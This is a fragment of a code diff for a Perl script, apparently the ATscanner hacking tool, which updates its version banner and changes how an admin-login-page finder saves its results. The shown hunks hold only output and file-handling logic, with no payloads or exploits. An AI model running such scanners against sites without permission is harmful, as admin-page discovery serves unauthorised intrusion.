+        print INFO "$URL\n";
+	    close (INFO);
+      }
+    } ####### IF NO USE LIST
+	
+    $list = "Admin_page.txt";
+	if (-e $list){  ### 
+      print" \n";
+	  print color 'yellow';
+      print "    [+] Results saved in Admin_page.txt! \n";
+	  print color 'yellow', RESET;
+	}else{ 
+	  print color 'red';
+      print "    [+] No Admin Page Login Found! \n";
+	  print color 'red', RESET;
+	} 
     print color 'red';
     print "    [!] SCAN FINISHED!\n";
     print color 'red', RESET;
-    $list = "Admin_page.txt";
-	if (-e $list){
-      print color 'yellow';
-      print "    [+] Do You Want To Save results? (Y/N): ";
-      print color 'yellow', RESET;
-      $save=<STDIN>;
-      chomp($save);
-      if ($save =~ m/n/i || m/no/i ){
-        unlink  'Admin_page.txt';
-      }else{
-        print color 'green';
-        print "    [+] Scan saved to Admin_page.txt\n";
-        print color 'yellow', RESET;
-      }
-     }else{
-       print color 'red';
-       print "    [!] No Admin page Found!\n";
-	   print color 'red', RESET;
-	}
+	
     after7:;
     print color 'bold yellow';
     print "    [+] Now You Want To Back To Menu (1) Or Exit (0) ? ";
@@ -1745,7 +2130,9 @@ if ($ID==3){
       goto after7;
     }
   }
-  ##########
+  ####### END ADMIN PAGE
+  
+  #######
   #BACK
   if ($ID == 8) {
 	goto TASKS;
@@ -2840,7 +3227,7 @@ if($task eq "5"){
   print color 'bold cyan';
   print "
      [+]================================================================[+]
-     [+]--------------            ATscanner - V 1.1         --------------[+]
+     [+]--------------            ATscanner - V 2         --------------[+]
      [+]================================================================[+]
      [+]--------------           AlisamTechnology         --------------[+]
      [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
